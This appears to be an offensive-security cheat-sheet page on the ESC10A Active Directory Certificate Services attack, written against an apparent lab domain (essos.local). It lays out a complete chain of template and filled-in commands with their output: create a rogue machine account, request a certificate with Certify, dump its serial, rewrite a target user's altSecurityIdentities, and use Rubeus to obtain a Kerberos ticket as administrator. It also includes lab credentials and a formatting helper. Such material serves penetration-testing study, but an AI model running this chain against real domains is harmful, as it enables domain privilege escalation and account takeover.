title: ESC10: Weak Certificate Mappings
html:
ESC10A: Write access to altSecurityIdentities — map any certificate to any account. ESC10B: Weak CertificateMappingMethods registry settings allowing partial subject matching.

ESC10A — Create Computer + Map Certificate to Target

# Create attacker-controlled machine account
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123!' <domain>/<username>:<password>@<dc-ip>
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123!' essos/missandei:fr3edom@meereen.essos.local

[*] Successfully added machine account EVIL$ with password Password123!.
# Request machine certificate
Certify.exe request /ca:<ca-host>\<ca-name> /template:Machine /machine
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:Machine /machine

[*] Current user context : ESSOS\EVIL$
[*] CA Response          : The certificate has been issued.
[*] Request ID           : 18
# Dump certificate serial number
certutil -dump evil.pem
certutil -dump evil.pem

Serial Number: 6100000028f9b2d3c5a1b4e87a00000000000028
Issuer: CN=ESSOS-CA, DC=essos, DC=local
Subject: CN=EVIL, CN=Computers, DC=essos, DC=local
# Map certificate to target user's altSecurityIdentities
$dn = "CN=<target-user>,CN=Users,DC=<domain>,DC=local"
$mapping = "X509:<I>CN=<ca-name>,DC=<domain>,DC=local<S><cert-serial>"
Set-ADObject -Identity $dn -Replace @{'altSecurityIdentities' = $mapping}
# Authenticate as target user using machine certificate
Rubeus.exe asktgt /user:<target-user> /certificate:evil.pfx /password:Password123!
Rubeus.exe asktgt /user:administrator /certificate:evil.pfx /password:Password123!

[*] Using certificate mapping via altSecurityIdentities
[+] TGT request successful!

  UserName : administrator
  UserRealm: ESSOS.LOCAL

X509 Issuer/Serial Mapping Format

Tip

Use this Python helper to format the altSecurityIdentities value correctly.

python3 x509_issuer_serial_number_format.py -serial "<cert-serial>" -issuer "CN=<ca-name>,DC=<domain>,DC=local"
python3 x509_issuer_serial_number_format.py \
    -serial "43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11" \
    -issuer "CN=ESSOS-CA,DC=essos,DC=local"

X509:<I>DC=local,DC=essos,CN=ESSOS-CA<SR>110000000000a68816e592b078921100000043
excerpt: ESC10A: Write access to altSecurityIdentities — map any certificate to any account. ESC10B: Weak CertificateMappingMethods registry settings allowing partial subject matching. ESC10A — Create Computer
